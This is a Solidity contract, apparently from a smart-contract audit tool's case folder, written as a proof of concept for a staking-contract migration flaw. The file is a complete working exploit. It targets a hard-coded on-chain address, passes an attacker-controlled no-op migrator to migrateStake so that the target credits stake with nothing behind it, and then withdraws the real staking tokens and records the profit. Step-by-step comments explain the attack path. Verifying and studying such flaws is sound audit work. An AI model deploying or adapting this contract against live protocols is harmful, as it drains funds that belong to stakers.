D /Users/zhanglongqin/AuditHoundV2/cases/templedao/src/onchain_auto/src/FlawVerifier.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStaxLPStakingLike {
    function stakingToken() external view returns (address);
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdraw(uint256 amount, bool claim) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xd2869042E12a3506100af1D192b5b04D65137941;

    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() public {
        address token = profitToken();
        uint256 balanceBefore = IERC20Like(token).balanceOf(address(this));

        uint256 largeAmount = IERC20Like(token).balanceOf(TARGET);
        require(largeAmount > 0, "no pool balance");

        address chosenAddress = address(this);

        // Exploit path 1: choose any address that will not revert when called.
        // `chosenAddress` is attacker-controlled and exposes `migrateWithdraw(address,uint256)` as a no-op.
        // Exploit path 2: call `migrateStake(chosenAddress, largeAmount)` on the vulnerable staking contract.
        // Exploit path 3: the target executes `migrateWithdraw(msg.sender, largeAmount)` against `chosenAddress`.
        // Exploit path 4: after that external call returns, the target still runs `_applyStake(msg.sender, largeAmount)`.
        // Exploit path 5: the attacker then calls `withdraw(largeAmount, false)` to pull out real staking tokens.
        // No extra funding is needed here because the bug mints unbacked internal stake directly.
        IStaxLPStakingLike(TARGET).migrateStake(chosenAddress, largeAmount);
        IStaxLPStakingLike(TARGET).withdraw(largeAmount, false);

        uint256 balanceAfter = IERC20Like(token).balanceOf(address(this));
        require(balanceAfter > balanceBefore, "no profit");

        _profitAmount = balanceAfter - balanceBefore;
    }

    function migrateWithdraw(address, uint256) external {}

    fallback() external payable {}

    function profitToken() public view returns (address) {
        return IStaxLPStakingLike(TARGET).stakingToken();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}
